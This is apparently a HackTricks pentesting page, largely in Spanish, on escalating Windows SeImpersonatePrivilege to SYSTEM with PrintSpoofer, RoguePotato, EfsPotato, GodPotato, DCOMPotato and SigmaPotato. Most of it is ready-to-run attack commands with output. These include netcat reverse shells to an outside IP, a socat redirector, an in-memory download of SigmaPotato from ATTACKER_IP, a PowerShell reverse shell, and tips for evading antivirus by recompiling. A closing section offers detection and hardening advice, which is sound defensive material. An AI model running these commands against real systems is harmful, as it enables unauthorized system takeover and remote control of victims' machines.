# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **obtener los mismos privilegios y conseguir acceso a nivel `NT AUTHORITY\SYSTEM`**. Esta [entrada del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de los privilegios de impersonation en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.

> [!TIP]
> Una alternativa moderna mantenida frecuentemente en 2024–2025 es SigmaPotato (un fork de GodPotato) que añade uso en memoria/.NET reflection y soporte de SO extendido. Ver uso rápido abajo y el repo en Referencias.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos y consideraciones comunes

Todas las siguientes técnicas dependen de abusar de un servicio privilegiado capaz de impersonation desde un contexto que tenga cualquiera de los siguientes privilegios:

- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
- No se requiere alta integridad si el token ya tiene SeImpersonatePrivilege (típico para muchas cuentas de servicio como IIS AppPool, MSSQL, etc.)

Comprueba los privilegios rápidamente:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operativas:

- Si tu shell se ejecuta bajo un token restringido que carece de SeImpersonatePrivilege (común para Local Service/Network Service en algunos contextos), restaura los privilegios predeterminados de la cuenta usando FullPowers, luego ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible a través del endpoint RPC local (spoolss). En entornos endurecidos donde Spooler está deshabilitado tras PrintNightmare, prefiere RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere un OXID resolver accesible en TCP/135. Si egress está bloqueado, usa un redirector/port-forwarder (ver ejemplo abajo). Las builds antiguas necesitaban el -f flag.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si un pipe está bloqueado, prueba pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo normalmente indica un servicio de autenticación RPC desconocido/no soportado; prueba con otro pipe/transporte o asegura que el servicio objetivo esté en ejecución.

## Demostración rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Puedes usar -i para spawn un proceso interactivo en la consola actual, o -c para ejecutar un one-liner.
- Requiere Spooler service. Si está deshabilitado, esto fallará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si el puerto saliente 135 está bloqueado, pivot the OXID resolver a través de socat en tu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Consejo: Si un pipe falla o EDR lo bloquea, intenta con los otros pipes compatibles:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato proporciona dos variantes dirigidas a objetos DCOM de servicio que por defecto usan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binaries proporcionados y ejecuta tu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork actualizado de GodPotato)

SigmaPotato añade mejoras modernas como ejecución en memoria mediante .NET reflection y un PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notas de detección y hardening

- Monitorizar procesos que creen named pipes y que llamen inmediatamente a las token-duplication APIs seguidas de CreateProcessAsUser/CreateProcessWithTokenW. Sysmon puede mostrar telemetría útil: Event ID 1 (creación de procesos), 17/18 (named pipe creado/conectado) y líneas de comando que lancen procesos hijo como SYSTEM.
- Endurecimiento del Spooler: Deshabilitar el servicio Print Spooler en servidores donde no se necesita evita coerciones locales al estilo PrintSpoofer a través de spoolss.
- Endurecimiento de cuentas de servicio: Minimizar la asignación de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a servicios personalizados. Considerar ejecutar servicios bajo cuentas virtuales con los privilegios mínimos requeridos e aislarlos con service SID y tokens con permiso de escritura restringido cuando sea posible.
- Controles de red: Bloquear TCP/135 saliente o restringir el tráfico del RPC endpoint mapper puede romper RoguePotato a menos que haya un redirector interno disponible.
- EDR/AV: Todas estas herramientas tienen firmas ampliamente reconocidas. Recompilar desde el código fuente, renombrar símbolos/strings o usar ejecución in-memory puede reducir la detección pero no derrotará detecciones comportamentales robustas.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
